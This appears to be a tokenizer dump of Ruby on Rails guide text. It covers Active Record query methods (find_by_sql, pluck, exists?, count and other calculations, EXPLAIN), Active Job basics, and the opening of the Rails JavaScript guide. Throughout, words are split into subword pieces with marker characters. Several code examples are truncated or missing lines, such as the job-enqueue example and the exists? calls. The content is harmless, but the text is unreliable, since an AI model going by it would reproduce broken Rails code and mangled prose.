▁When ▁you ▁want ▁to ▁save ▁it ▁to ▁the ▁database , ▁just ▁call ▁` save ` :
▁ n ic k . save
▁Find ing ▁by ▁SQL
▁If ▁you ' d ▁like ▁to ▁use ▁your ▁own ▁SQL ▁to ▁find ▁records ▁in ▁a ▁table ▁you ▁can ▁use ▁` find _ by _ sql `.
▁The ▁` find _ by _ sql ` ▁method ▁will ▁return ▁an ▁array ▁of ▁objects ▁even ▁if ▁the ▁under ly ing ▁query ▁returns ▁just ▁a ▁single ▁record .
▁For ▁example ▁you ▁could ▁run ▁this ▁query :
▁Client . find _ by _ sql (" SELECT ▁* ▁FROM ▁clients
▁ IN N ER ▁JOIN ▁orders ▁ ON ▁clients . id ▁= ▁orders . client _ id
▁OR DER ▁BY ▁clients . created _ at ▁ de sc ")
▁# ▁=> ▁[
▁#< Client ▁id : ▁1, ▁first _ name : ▁" L u ca s " ▁ > ,
▁#< Client ▁id : ▁2, ▁first _ name : ▁" J an " ▁ > ,
▁# ▁...
▁` find _ by _ sql ` ▁provides ▁you ▁with ▁a ▁simple ▁way ▁of ▁making ▁custom ▁calls ▁to ▁the ▁database ▁and ▁retriev ing ▁ instantiated ▁objects .
▁### ▁` select _ all `
▁` find _ by _ sql ` ▁has ▁a ▁close ▁relative ▁called ▁` connect ion # select _ all `. ▁` select _ all ` ▁will ▁retrieve ▁objects ▁from ▁the ▁database ▁using ▁custom ▁SQL ▁just ▁like ▁` find _ by _ sql ` ▁but ▁will ▁not ▁in st ant i ate ▁them .
▁Instead , ▁you ▁will ▁get ▁an ▁array ▁of ▁hashes ▁where ▁each ▁hash ▁indicates ▁a ▁record .
▁Client . connect ion . select _ all (" SELECT ▁first _ name , ▁created _ at ▁FROM ▁clients ▁WHERE ▁id ▁= ▁' 1 ' ")
▁{" first _ name "=>" R a fa el ", ▁" created _ at "=>" 20 12 - 11 - 10 ▁ 23 : 23 : 4 5 . 28 11 89 " },
▁{" first _ name "=>" E i le en ", ▁" created _ at "=>" 20 1 3- 12 - 0 9 ▁ 11 : 22 : 3 5 . 22 12 8 2 "}
▁### ▁` pluck `
▁` pluck ` ▁can ▁be ▁used ▁to ▁query ▁single ▁or ▁multiple ▁columns ▁from ▁the ▁under ly ing ▁table ▁of ▁a ▁model .
▁It ▁accept s ▁a ▁list ▁of ▁column ▁names ▁as ▁argument ▁and ▁returns ▁an ▁array ▁of ▁values ▁of ▁the ▁specified ▁columns ▁with ▁the ▁corresponding ▁data ▁type .
▁Client . where ( active : ▁true ). pluck (: id )
▁# ▁ SELECT ▁id ▁FROM ▁clients ▁WHERE ▁active ▁= ▁1
▁# ▁=> ▁[1, ▁2, ▁3 ]
▁Client . distinct . pluck (: r o le )
▁# ▁ SELECT ▁D I ST IN C T ▁role ▁FROM ▁clients
▁# ▁=> ▁[ ' admin ' , ▁' member ' , ▁' guest ']
▁Client . pluck (: id , ▁: name )
▁# ▁ SELECT ▁clients . id , ▁clients . name ▁FROM ▁clients
▁# ▁=> ▁[[1, ▁' David '] , ▁[ 2 , ▁' J er e my '] , ▁[ 3 , ▁' J o se ' ]]
▁` pluck ` ▁make s ▁it ▁possible ▁to ▁replace ▁code ▁like :
▁Client . select (: id ). map ▁ { ▁| c | ▁c . id ▁ }
▁Client . select (: id ). map ( & : id )
▁Client . select (: id , ▁: name ). map ▁ { ▁| c | ▁[ c . id , ▁c . name ] ▁ }
▁with :
▁Client . pluck (: id )
▁Un like ▁` select `, ▁` pluck ` ▁directly ▁convert s ▁a ▁database ▁result ▁into ▁a ▁Ruby ▁` Array `, < n > with out ▁construct ing ▁` ActiveRecord ` ▁objects .
▁This ▁can ▁mean ▁better ▁performance ▁for < n > a ▁large ▁or ▁often - running ▁query .
▁However , ▁any ▁model ▁method ▁override s ▁will < n > not ▁be ▁available .
▁def ▁name
▁" I ▁a m ▁# { super } "
▁Client . select (: name ). map ▁ & : name
▁# ▁=> ▁[" I ▁a m ▁ David ", ▁" I ▁a m ▁ J er e my ", ▁" I ▁a m ▁ J o se "]
▁Client . pluck (: name )
▁# ▁=> ▁[" David ", ▁" J er e my ", ▁" J o se "]
▁F urther more , ▁unlike ▁` select ` ▁and ▁other ▁` Relation ` ▁scope s , ▁` pluck ` ▁trigger s ▁an ▁imm edia t e < n > query , ▁and ▁thus ▁cannot ▁be ▁chain ed ▁with ▁any ▁further ▁scope s , ▁although ▁it ▁can ▁work ▁with < n > scope s ▁already ▁construct ed ▁earlier :
▁Client . pluck (: name ). limit (1)
▁# ▁=> ▁ NoMethodError : ▁undefined ▁method ▁` limit ' ▁for ▁#< Array : 0 x 0 07 ff 34 d 3 ad 6 d 8 >
▁Client . limit (1) . pluck (: name )
▁# ▁=> ▁[" David "]
▁### ▁` id s `
▁` id s ` ▁can ▁be ▁used ▁to ▁ pluck ▁all ▁the ▁ ID s ▁for ▁the ▁relation ▁using ▁the ▁table ' s ▁primary ▁key .
▁Person . id s
▁# ▁ SELECT ▁id ▁FROM ▁people
▁class ▁Person ▁< ▁ActiveRecord :: Base
▁self . primary _ key ▁= ▁" person _ id "
▁# ▁ SELECT ▁person _ id ▁FROM ▁people
▁ Ex ist ence ▁of ▁Object s
▁If ▁you ▁simply ▁want ▁to ▁check ▁for ▁the ▁exist ence ▁of ▁the ▁object ▁there ' s ▁a ▁method ▁called ▁` exists ?
▁This ▁method ▁will ▁query ▁the ▁database ▁using ▁the ▁same ▁query ▁as ▁` find `, ▁but ▁instead ▁of ▁return ing ▁an < n > object ▁or ▁collection ▁of ▁objects ▁it ▁will ▁return ▁either ▁` true ` ▁or ▁` false `.
▁The ▁` exists ?` ▁method ▁also ▁take s ▁multiple ▁values , ▁but ▁the ▁catch ▁is ▁that ▁it ▁will ▁return ▁` true ` ▁if ▁any < n > one ▁of ▁those ▁records ▁exists .
▁id : ▁[1, 2 , 3 ])
▁name : ▁[ ' John ' , ▁' S er ge i ' ])
▁It ' s ▁even ▁possible ▁to ▁use ▁` exists ?` ▁without ▁any ▁arguments ▁on ▁a ▁model ▁or ▁a ▁relation .
▁Client . where ( first _ name : ▁' Ryan ' ). exists ?
▁The ▁above ▁returns ▁` true ` ▁if ▁there ▁is ▁at ▁least ▁one ▁client ▁with ▁the ▁` first _ name ` ▁' Ryan ' ▁and ▁` false `< n > other wise .
▁Client . exists ?
▁The ▁above ▁returns ▁` false ` ▁if ▁the ▁` client s ` ▁table ▁is ▁empty ▁and ▁` true ` ▁otherwise .
▁You ▁can ▁also ▁use ▁` any ?` ▁and ▁` many ?` ▁to ▁check ▁for ▁exist ence ▁on ▁a ▁model ▁or ▁relation .
▁# ▁via ▁a ▁model
▁Article . any ?
▁Article . many ?
▁# ▁via ▁a ▁named ▁scope
▁Article . recent . any ?
▁Article . recent . many ?
▁# ▁via ▁a ▁relation
▁Article . where ( published : ▁true ). any ?
▁Article . where ( published : ▁true ). many ?
▁# ▁via ▁an ▁association
▁Article . first . cat eg or ies . any ?
▁Article . first . cat eg or ies . many ?
▁C al c ul ation s
▁This ▁section ▁uses ▁count ▁as ▁an ▁example ▁method ▁in ▁this ▁pre am b le , ▁but ▁the ▁options ▁describe d ▁apply ▁to ▁all ▁sub - section s .
▁All ▁calculat ion ▁methods ▁work ▁directly ▁on ▁a ▁model :
▁Client . count
▁# ▁ SELECT ▁count ( * ) ▁A S ▁count _ all ▁FROM ▁clients
▁Or ▁on ▁a ▁relation :
▁Client . where ( first _ name : ▁' Ryan ' ). count
▁# ▁ SELECT ▁count ( * ) ▁A S ▁count _ all ▁FROM ▁clients ▁WHERE ▁( first _ name ▁= ▁' Ryan ')
▁You ▁can ▁also ▁use ▁ various ▁finder ▁methods ▁on ▁a ▁relation ▁for ▁perform ing ▁complex ▁ calculations :
▁Client . include s (" orders ") . where ( first _ name : ▁' Ryan ' , ▁orders : ▁ { ▁status : ▁' receive d ' ▁ }). count
▁Whi ch ▁will ▁execute :
▁ SELECT ▁count ( D I ST IN C T ▁clients . id ) ▁A S ▁count _ all ▁FROM ▁clients
▁ LE F T ▁O UT ER ▁JOIN ▁orders ▁ ON ▁orders . client _ id ▁= ▁client . id ▁WHERE
▁( client s . first _ name ▁= ▁' Ryan ' ▁ AND ▁orders . status ▁= ▁' receive d ')
▁### ▁Co un t
▁If ▁you ▁want ▁to ▁see ▁how ▁many ▁records ▁are ▁in ▁your ▁model ' s ▁table ▁you ▁could ▁call ▁` Client . count ` ▁and ▁that ▁will ▁return ▁the ▁number .
▁If ▁you ▁want ▁to ▁be ▁more ▁specific ▁and ▁find ▁all ▁the ▁clients ▁with ▁their ▁ age ▁present ▁in ▁the ▁database ▁you ▁can ▁use ▁` Client . count (: age ) `.
▁For ▁options , ▁please ▁see ▁the ▁ parent ▁section , ▁[ C al c ul ation s ](# calculations ).
▁### ▁A verage
▁If ▁you ▁want ▁to ▁see ▁the ▁a verage ▁of ▁a ▁certain ▁number ▁in ▁one ▁of ▁your ▁table s ▁you ▁can ▁call ▁the ▁` a verage ` ▁method ▁on ▁the ▁class ▁that ▁relate s ▁to ▁the ▁table .
▁This ▁method ▁call ▁will ▁look ▁something ▁like ▁this :
▁Client . a verage (" orders _ count ")
▁This ▁will ▁return ▁a ▁number ▁( possibl y ▁a ▁f lo at ing ▁point ▁number ▁such ▁as ▁3.1 4 1 59 2 6 5 ) ▁represent ing ▁the ▁a verage ▁value ▁in ▁the ▁field .
▁### ▁M in i m um
▁If ▁you ▁want ▁to ▁find ▁the ▁minimum ▁value ▁of ▁a ▁field ▁in ▁your ▁table ▁you ▁can ▁call ▁the ▁` minimum ` ▁method ▁on ▁the ▁class ▁that ▁relate s ▁to ▁the ▁table .
▁Client . minimum (" age ")
▁### ▁M a x i m um
▁If ▁you ▁want ▁to ▁find ▁the ▁ maximum ▁value ▁of ▁a ▁field ▁in ▁your ▁table ▁you ▁can ▁call ▁the ▁` maximum ` ▁method ▁on ▁the ▁class ▁that ▁relate s ▁to ▁the ▁table .
▁Client . maximum (" age ")
▁### ▁S um
▁If ▁you ▁want ▁to ▁find ▁the ▁ sum ▁of ▁a ▁field ▁for ▁all ▁records ▁in ▁your ▁table ▁you ▁can ▁call ▁the ▁` sum ` ▁method ▁on ▁the ▁class ▁that ▁relate s ▁to ▁the ▁table .
▁Client . sum (" orders _ count ")
▁Running ▁E X PLAIN
▁You ▁can ▁run ▁E X PLAIN ▁on ▁the ▁queries ▁trigger ed ▁by ▁relation s .
▁For ▁example ,
▁User . where ( id : ▁1) . joins (: articles ). explain
▁may ▁yield
▁E X PLAIN ▁for : ▁ SELECT ▁` users `.
▁* ▁FROM ▁` users ` ▁ IN N ER ▁JOIN ▁` articles ` ▁ ON ▁` articles `. ` user _ id ` ▁= ▁` users `. ` id ` ▁WHERE ▁` users `. ` id ` ▁= ▁1
▁ + - --- + ------------- + - --------- + - ------ + --------------- +
▁| ▁id ▁| ▁select _ type ▁| ▁table ▁| ▁type ▁| ▁possible _ keys ▁|
▁| ▁1 ▁| ▁S I MPLE ▁| ▁users ▁| ▁ const ▁| ▁P R I M A R Y ▁|
▁| ▁1 ▁| ▁S I MPLE ▁| ▁articles ▁| ▁A L L ▁| ▁NULL ▁|
▁ + --------- + --------- + - ------ + ------ + ------------- +
▁| ▁key ▁| ▁key _ le n ▁| ▁ ref ▁| ▁row s ▁| ▁ Extra ▁|
▁| ▁P R I M A R Y ▁| ▁4 ▁| ▁ const ▁| ▁1 ▁| ▁|
▁| ▁NULL ▁| ▁NULL ▁| ▁NULL ▁| ▁1 ▁| ▁Using ▁where ▁|
▁2 ▁row s ▁in ▁set ▁( 0 . 00 ▁ sec )
▁under ▁MySQL .
▁So , ▁the ▁same ▁query ▁running ▁with ▁the ▁PostgreSQL ▁adapter ▁would ▁yield ▁instead
▁E X PLAIN ▁for : ▁ SELECT ▁" users ".
▁* ▁FROM ▁" users " ▁ IN N ER ▁JOIN ▁" articles " ▁ ON ▁" articles "." user _ id " ▁= ▁" users "." id " ▁WHERE ▁" users "." id " ▁= ▁1
▁ Q U ER Y ▁P L A N
▁-------------- ---------------- ---------------- ---------------- ----------------
▁Join ▁F il ter : ▁( articles . user _ id ▁= ▁users . id )
▁-> ▁Inde x ▁S can ▁using ▁users _ p key ▁on ▁users ▁( co st = 0 . 00 . . 8 . 27 ▁row s = 1 ▁ width = 4 )
▁Inde x ▁Co n d : ▁( id ▁= ▁1)
▁-> ▁S e q ▁S can ▁on ▁articles ▁( co st = 0 . 00 . . 28 . 88 ▁row s = 8 ▁ width = 4 )
▁( 6 ▁row s )
▁E age r ▁load ing ▁may ▁trigger ▁more ▁than ▁one ▁query ▁under ▁the ▁hood , ▁and ▁some ▁queries < n > ma y ▁need ▁the ▁results ▁of ▁previous ▁one s .
▁Because ▁of ▁that , ▁` explain ` ▁actually < n > ex ec ute s ▁the ▁query , ▁and ▁the n ▁as k s ▁for ▁the ▁query ▁plan s .
▁User . where ( id : ▁1) . include s (: articles ). explain
▁yields
▁* ▁FROM ▁` users ` ▁WHERE ▁` users `. ` id ` ▁= ▁1
▁ + - --- + ------------- + - ------ + - ------ + --------------- +
▁| ▁id ▁| ▁select _ type ▁| ▁table ▁| ▁type ▁| ▁possible _ keys ▁|
▁| ▁1 ▁| ▁S I MPLE ▁| ▁users ▁| ▁ const ▁| ▁P R I M A R Y ▁|
▁ + --------- + --------- + - ------ + ------ + - ------ +
▁| ▁key ▁| ▁key _ le n ▁| ▁ ref ▁| ▁row s ▁| ▁ Extra ▁|
▁| ▁P R I M A R Y ▁| ▁4 ▁| ▁ const ▁| ▁1 ▁| ▁|
▁1 ▁row ▁in ▁set ▁( 0 . 00 ▁ sec )
▁E X PLAIN ▁for : ▁ SELECT ▁` articles `.
▁* ▁FROM ▁` articles ` ▁WHERE ▁` articles `. ` user _ id ` ▁ IN ▁ (1)
▁ + - --- + ------------- + - --------- + ------ + --------------- +
▁| ▁id ▁| ▁select _ type ▁| ▁table ▁| ▁type ▁| ▁possible _ keys ▁|
▁| ▁1 ▁| ▁S I MPLE ▁| ▁articles ▁| ▁A L L ▁| ▁NULL ▁|
▁ + ------ + --------- + ------ + ------ + ------------- +
▁| ▁key ▁| ▁key _ le n ▁| ▁ ref ▁| ▁row s ▁| ▁ Extra ▁|
▁| ▁NULL ▁| ▁NULL ▁| ▁NULL ▁| ▁1 ▁| ▁Using ▁where ▁|
▁### ▁In ter pre ting ▁E X PLAIN
▁In ter pre t ation ▁of ▁the ▁output ▁of ▁E X PLAIN ▁is ▁ beyond ▁the ▁scope ▁of ▁this ▁guide .
▁The < n > following ▁point ers ▁may ▁be ▁helpful :
▁* ▁SQLite 3 : ▁[ E X PLAIN ▁ Q U ER Y ▁P L A N ]( http :// www . sqlite . org / e q p . html )
▁* ▁MySQL : ▁[ E X PLAIN ▁Ou t put ▁Format ]( http :// dev . mysql . com / doc / ref ma n / 5 . 6 / en / explain - out put . html )
▁* ▁PostgreSQL : ▁[ U s ing ▁E X PLAIN ]( http :// www . postgresql . org / doc s / current / static / using - explain . html )
▁Active ▁Job ▁B as ic s
▁= ================
▁This ▁guide ▁provides ▁you ▁with ▁all ▁you ▁need ▁to ▁get ▁started ▁in ▁creating ,< n > en queue ing ▁and ▁execut ing ▁background ▁job s .
▁* ▁How ▁to ▁create ▁job s .
▁* ▁How ▁to ▁ en queue ▁job s .
▁* ▁How ▁to ▁run ▁job s ▁in ▁the ▁background .
▁* ▁How ▁to ▁send ▁email s ▁from ▁your ▁application ▁as y n c .
▁Active ▁Job ▁is ▁a ▁framework ▁for ▁declar ing ▁job s ▁and ▁making ▁them ▁run ▁on ▁a ▁variety < n > of ▁ queue ing ▁back end s .
▁These ▁job s ▁can ▁be ▁everything ▁from ▁regular ly ▁ s ch ed ul ed < n > c le an - up s , ▁to ▁b i ll ing ▁charge s , ▁to ▁mail ing s .
▁Any th ing ▁that ▁can ▁be ▁ ch o p ped ▁up < n > in to ▁small ▁ unit s ▁of ▁work ▁and ▁run ▁in ▁parallel , ▁really .
▁-------------- ---------------
▁The ▁main ▁point ▁is ▁to ▁ensure ▁that ▁all ▁Rails ▁app s ▁will ▁have ▁a ▁job ▁in f ra structure < n > in ▁place , ▁even ▁if ▁it ' s ▁in ▁the ▁form ▁of ▁an ▁" i m m edia t e ▁run n er ".
▁We ▁can ▁the n ▁have < n > framework ▁features ▁and ▁other ▁gems ▁build ▁on ▁to p ▁of ▁that , ▁without ▁ having ▁to < n > w or ry ▁about ▁API ▁difference s ▁between ▁ various ▁job ▁run n ers ▁such ▁as ▁De la y ed ▁Job < n > and ▁Re s q ue .
▁P ic k ing ▁your ▁ q ue u ing ▁back end ▁becomes ▁more ▁of ▁an ▁operation al ▁concern ,< n > the n .
▁And ▁you ' ll ▁be ▁able ▁to ▁switch ▁between ▁them ▁without ▁ having ▁to ▁re write ▁your ▁job s .
▁Creat ing ▁a ▁Job
▁This ▁section ▁will ▁provide ▁a ▁step - by - step ▁guide ▁to ▁creating ▁a ▁job ▁and ▁ en q ue u ing ▁it .
▁### ▁Create ▁the ▁Job
▁Active ▁Job ▁provides ▁a ▁Rails ▁generator ▁to ▁create ▁job s .
▁ $ ▁bin / rails ▁generate ▁job ▁ guest s _ cleanup
▁create ▁app / job s / guest s _ cleanup _ job . rb
▁You ▁can ▁also ▁create ▁a ▁job ▁that ▁will ▁run ▁on ▁a ▁specific ▁ queue :
▁ $ ▁bin / rails ▁generate ▁job ▁ guest s _ cleanup ▁-- queue ▁ ur g ent
▁If ▁you ▁don ' t ▁want ▁to ▁use ▁a ▁generator , ▁you ▁could ▁create ▁your ▁own ▁file ▁inside ▁of < n >` app / job s `, ▁just ▁make ▁sure ▁that ▁it ▁inherit s ▁from ▁` Active J ob :: Base `.
▁Here ' s ▁what ▁a ▁job ▁look s ▁like :
▁class ▁G u est s C le an up J ob ▁< ▁Active J ob :: Base
▁ queue _ as ▁: default
▁def ▁perform ( * args )
▁# ▁Do ▁something ▁later
▁### ▁E n queue ▁the ▁Job
▁E n queue ▁a ▁job ▁like ▁so :
▁to m or row
▁That ' s ▁it !
▁Job ▁ Ex e cut ion
▁If ▁no ▁adapter ▁is ▁set , ▁the ▁job ▁is ▁immediately ▁executed .
▁### ▁B ac k end s
▁Active ▁Job ▁has ▁built - in ▁adapter s ▁for ▁multiple ▁ queue ing ▁back end s ▁( S id e k i q ,< n > Re s q ue , ▁De la y ed ▁Job ▁and ▁other s ).
▁To ▁get ▁an ▁up - to - date ▁list ▁of ▁the ▁adapter s < n > see ▁the ▁API ▁Documentation ▁for ▁[ Active J ob :: Q ue ue Adapters ]( http :// api . rubyonrails . org / classes / Active J ob / Q ue ue Adapters . html ).
▁# ▁config / application . rb
▁ Q ue ue s
▁ Most ▁of ▁the ▁adapter s ▁support ▁multiple ▁ queue s .
▁With ▁Active ▁Job ▁you ▁can ▁ s ch ed ul e < n > the ▁job ▁to ▁run ▁on ▁a ▁specific ▁ queue :
▁ queue _ as ▁: low _ p r i or ity
▁# . . . .
▁You ▁can ▁prefix ▁the ▁ queue ▁name ▁for ▁all ▁your ▁job s ▁using < n >` config . active _ job . queue _ name _ prefix ` ▁in ▁` application . rb ` :
▁config . active _ job . queue _ name _ prefix ▁= ▁Rails . env
▁# ▁app / job s / guest s _ cleanup . rb
▁# ▁Now ▁your ▁job ▁will ▁run ▁on ▁ queue ▁production _ low _ p r i or ity ▁on ▁your
▁# ▁environment
▁My J ob . set ( queue : ▁: another _ queue ). perform _ later ( record )
▁class ▁ Proc es s V id e o J ob ▁< ▁Active J ob :: Base
▁ queue _ as ▁do
▁video ▁= ▁self . argument s . first
▁if ▁video . own er . pre m i um ?
▁: pre m i um _ video job s
▁else
▁: video job s
▁def ▁perform ( video )
▁# ▁do ▁process ▁video
▁ Proc es s V id e o J ob . perform _ later ( V id e o . last )
▁NOTE : ▁ Make ▁sure ▁your ▁ queue ing ▁back end ▁" list en s " ▁on ▁your ▁ queue ▁name .
▁For ▁some < n > back end s ▁you ▁need ▁to ▁specify ▁the ▁ queue s ▁to ▁list en ▁to .
▁ Callbacks
▁Active ▁Job ▁provides ▁ hook s ▁during ▁the ▁life c y c le ▁of ▁a ▁job .
▁ Callbacks ▁allow ▁you ▁to < n > tr ig g er ▁logic ▁during ▁the ▁life c y c le ▁of ▁a ▁job .
▁### ▁A v a il able ▁callbacks
▁* ▁` before _ en queue `
▁* ▁` ar ound _ en queue `
▁* ▁` after _ en queue `
▁* ▁` before _ perform `
▁* ▁` ar ound _ perform `
▁* ▁` after _ perform `
▁### ▁U s age
▁before _ en queue ▁do ▁| job |
▁# ▁do ▁something ▁with ▁the ▁job ▁instance
▁around _ perform ▁do ▁| job , ▁block |
▁# ▁do ▁something ▁before ▁perform
▁block . c all
▁# ▁do ▁something ▁after ▁perform
▁Action ▁Mailer
▁One ▁of ▁the ▁most ▁common ▁job s ▁in ▁a ▁mode r n ▁web ▁application ▁is ▁sending ▁email s ▁outside < n > of ▁the ▁request - response ▁cycle , ▁so ▁the ▁user ▁does n ' t ▁have ▁to ▁wait ▁on ▁it .
▁Active ▁Job < n > is ▁integrat ed ▁with ▁Action ▁Mailer ▁so ▁you ▁can ▁easily ▁send ▁email s ▁a synchronously :
▁# ▁If ▁you ▁want ▁to ▁send ▁the ▁email ▁now ▁use ▁# deliver _ now
▁User Mailer . welcome (@ user ). deliver _ now
▁# ▁If ▁you ▁want ▁to ▁send ▁the ▁email ▁through ▁Active ▁Job ▁use ▁# deliver _ later
▁User Mailer . welcome (@ user ). deliver _ later
▁G lo b al ID
▁Active ▁Job ▁supports ▁G lo b al ID ▁for ▁parameters .
▁This ▁make s ▁it ▁possible ▁to ▁pass ▁live < n > Active ▁Record ▁objects ▁to ▁your ▁job ▁instead ▁of ▁class / id ▁pair s , ▁which ▁you ▁the n ▁have < n > to ▁manually ▁ de serialize .
▁Before , ▁job s ▁would ▁look ▁like ▁this :
▁class ▁T ra s h able C le an up J ob
▁def ▁perform ( trashable _ class , ▁ trashable _ id , ▁depth )
▁ trashable ▁= ▁ trashable _ class . constantize . find ( trashable _ id )
▁ trashable . cleanup ( de p th )
▁Now ▁you ▁can ▁simply ▁do :
▁def ▁perform ( trashable , ▁depth )
▁Active ▁Model
▁E xception s
▁Active ▁Job ▁provides ▁a ▁way ▁to ▁catch ▁exception s ▁raised ▁during ▁the ▁execut ion ▁of ▁the < n > job :
▁rescue _ from ( ActiveRecord :: RecordNotFound ) ▁do ▁| exception |
▁# ▁do ▁something ▁with ▁the ▁exception
▁Work ing ▁with ▁JavaScript ▁in ▁Rails
▁ ================ ================
▁This ▁guide ▁cover s ▁the ▁built - in ▁Ajax / JavaScript ▁functionality ▁of ▁Rails ▁( and < n > more ) ; ▁it ▁will ▁enable ▁you ▁to ▁create ▁rich ▁and ▁dynamic ▁Ajax ▁applications ▁with < n > e as e !
▁* ▁The ▁basic s ▁of ▁Ajax .
▁* ▁U nobtrusive ▁JavaScript .
▁* ▁How ▁Rails ' ▁built - in ▁helpers ▁assist ▁you .
▁* ▁How ▁to ▁handle ▁Ajax ▁on ▁the ▁server ▁side .
▁* ▁The ▁ Turbolinks ▁gem .
▁--------------- ---------------- ---------------- ---------------- ----------------
▁An ▁In tr o d u c t ion ▁to ▁Ajax
▁--------------- ---------
▁In ▁order ▁to ▁understand ▁Ajax , ▁you ▁must ▁first ▁understand ▁what ▁a ▁web ▁browser ▁does < n > normal ly .
▁When ▁you ▁type ▁` http :// localhost : 3 000 ` ▁into ▁your ▁browser ' s ▁address ▁bar ▁and ▁hit < n > ' G o , ' ▁the ▁browser ▁( your ▁' client ') ▁make s ▁a ▁request ▁to ▁the ▁server .
▁It ▁pars es ▁the < n > response , ▁the n ▁fetch es ▁all ▁ associated ▁assets , ▁like ▁JavaScript ▁files ,< n > stylesheets ▁and ▁images .
▁It ▁the n ▁as s em b le s ▁the ▁page .
▁If ▁you ▁click ▁a ▁link , ▁it < n > do es ▁the ▁same ▁process : ▁fetch ▁the ▁page , ▁fetch ▁the ▁assets , ▁put ▁it ▁all ▁together ,< n > show ▁you ▁the ▁results .
▁This ▁is ▁called ▁the ▁' request ▁response ▁cycle . '
▁JavaScript ▁can ▁also ▁make ▁requests ▁to ▁the ▁server , ▁and ▁ parse ▁the ▁response .
▁It < n > also ▁has ▁the ▁ability ▁to ▁update ▁information ▁on ▁the ▁page .
▁Co m bin ing ▁these ▁two < n > p o w ers , ▁a ▁JavaScript ▁ writer ▁can ▁make ▁a ▁web ▁page ▁that ▁can ▁update ▁just ▁parts ▁of < n > it self , ▁without ▁need ing ▁to ▁get ▁the ▁full ▁page ▁data ▁from ▁the ▁server .
▁This ▁is ▁a < n > p o w er ful ▁technique ▁that ▁we ▁call ▁Ajax .
▁Rails ▁ s h ips ▁with ▁CoffeeScript ▁by ▁default , ▁and ▁so ▁the ▁rest ▁of ▁the ▁examples < n > in ▁this ▁guide ▁will ▁be ▁in ▁CoffeeScript .
▁All ▁of ▁these ▁less on s , ▁of ▁course , ▁apply < n > to ▁ v a nil la ▁JavaScript ▁as ▁well .
▁As ▁an ▁example , ▁here ' s ▁some ▁CoffeeScript ▁code ▁that ▁make s ▁an ▁Ajax ▁request ▁using < n > the ▁jQuery ▁library :
▁`` ` coffee script
▁ $ . ajax ( url : ▁" / test ") . d one ▁( html ) ▁->
▁ $ (" # re s ul t s ") . app end ▁ html
▁This ▁code ▁fetch es ▁data ▁from ▁" / test ", ▁and ▁the n ▁app end s ▁the ▁result ▁to ▁the ▁` div `< n > with ▁an ▁id ▁of ▁` re s ul t s `.
▁Rails ▁provides ▁quite ▁a ▁bit ▁of ▁built - in ▁support ▁for ▁build ing ▁web ▁pages ▁with ▁this < n > tech n i q ue .
▁You ▁rare ly ▁have ▁to ▁write ▁this ▁code ▁yourself .
▁The ▁rest ▁of ▁this ▁guide < n > will ▁show ▁you ▁how ▁Rails ▁can ▁help ▁you ▁write ▁website s ▁in ▁this ▁way , ▁but ▁it ' s < n > all ▁built ▁on ▁to p ▁of ▁this ▁fai r ly ▁simple ▁technique .
▁U nobtrusive ▁JavaScript
▁--------------- ------ ----------------
▁Rails ▁uses ▁a ▁technique ▁called ▁" U nobtrusive ▁JavaScript " ▁to ▁handle ▁attach ing < n > JavaScript ▁to ▁the ▁DOM .
▁This ▁is ▁generally ▁consider ed ▁to ▁be ▁a ▁best - p r ac tic e < n > with in ▁the ▁front end ▁community , ▁but ▁you ▁may ▁ o cc as ion ally ▁read ▁tutorial s ▁that < n > demo n str ate ▁other ▁ways .
▁Here ' s ▁the ▁simplest ▁way ▁to ▁write ▁JavaScript .
▁You ▁may ▁see ▁it ▁ referred ▁to ▁as < n > ' in line ▁JavaScript ' :
▁< a ▁ href ="# " ▁on click =" this . style . backgroundColor =' # 99 0000 ' "> P aint ▁it ▁re d </ a >
▁When ▁click ed , ▁the ▁link ▁background ▁will ▁become ▁re d .
▁Here ' s ▁the ▁problem : ▁what < n > h app en s ▁when ▁we ▁have ▁lot s ▁of ▁JavaScript ▁we ▁want ▁to ▁execute ▁on ▁a ▁click ?
▁< a ▁ href ="# " ▁on click =" this . style . backgroundColor =' # 00 99 00 ' ; this . style . color =' # F F F F F F ' ; "> P aint ▁it ▁green </ a >
▁A w k w ar d , ▁right ?
▁We ▁could ▁pull ▁the ▁function ▁definition ▁out ▁of ▁the ▁click ▁handle r ,< n > and ▁turn ▁it ▁into ▁CoffeeScript :
▁ paintIt ▁= ▁( e le ment , ▁ backgroundColor , ▁text C ol or ) ▁->
▁element . style . backgroundColor ▁= ▁ backgroundColor
▁if ▁text C ol or ?
▁element . style . color ▁= ▁text C ol or
▁And ▁the n ▁on ▁our ▁page :
▁< a ▁ href ="# " ▁on click =" paintIt ( this , ▁' # 99 0000 ') "> P aint ▁it ▁re d </ a >
▁That ' s ▁a ▁little ▁bit ▁better , ▁but ▁what ▁about ▁multiple ▁links ▁that ▁have ▁the ▁same < n > e ffect ?
▁< a ▁ href ="# " ▁on click =" paintIt ( this , ▁' # 00 99 00 ' , ▁' # F F F F F F ') "> P aint ▁it ▁green </ a >
▁< a ▁ href ="# " ▁on click =" paintIt ( this , ▁' # 0000 99 ' , ▁' # F F F F F F ') "> P aint ▁it ▁b l ue </ a >
▁No t ▁very ▁ DRY , ▁e h ?
▁We ▁can ▁fix ▁this ▁by ▁using ▁even t s ▁instead .
▁We ' ll ▁add ▁a ▁` data - * `< n > attribute ▁to ▁our ▁link , ▁and ▁the n ▁bin d ▁a ▁handle r ▁to ▁the ▁click ▁even t ▁of ▁every ▁link < n > that ▁has ▁that ▁attribute :
▁ $ (" a [ data - back ground - color ] ") . click ▁( e ) ▁->
▁e . prev ent D e fa ul t ( )
▁ backgroundColor ▁= ▁ $ ( this ). data (" back ground - color ")
▁text C ol or ▁= ▁ $ ( this ). data (" text - color ")
▁ paintIt ( this , ▁ backgroundColor , ▁text C ol or )
▁< a ▁ href ="# " ▁data - back ground - color ="# 00 99 00 " ▁data - text - color ="# F F F F F F "> P aint ▁it ▁green </ a >
▁< a ▁ href ="# " ▁data - back ground - color ="# 0000 99 " ▁data - text - color ="# F F F F F F "> P aint ▁it ▁b l ue </ a >
▁We ▁call ▁this ▁' u nobtrusive ' ▁JavaScript ▁because ▁we ' re ▁no ▁longer ▁mix ing ▁our < n > JavaScript ▁into ▁our ▁HTML .
▁We ' ve ▁properly ▁separate d ▁our ▁concern s , ▁making ▁future < n > change ▁easy .
▁We ▁can ▁easily ▁add ▁behavior ▁to ▁any ▁link ▁by ▁adding ▁the ▁data < n > attribute .
▁We ▁can ▁run ▁all ▁of ▁our ▁JavaScript ▁through ▁a ▁ mini m ize r ▁and < n > concat en at or .
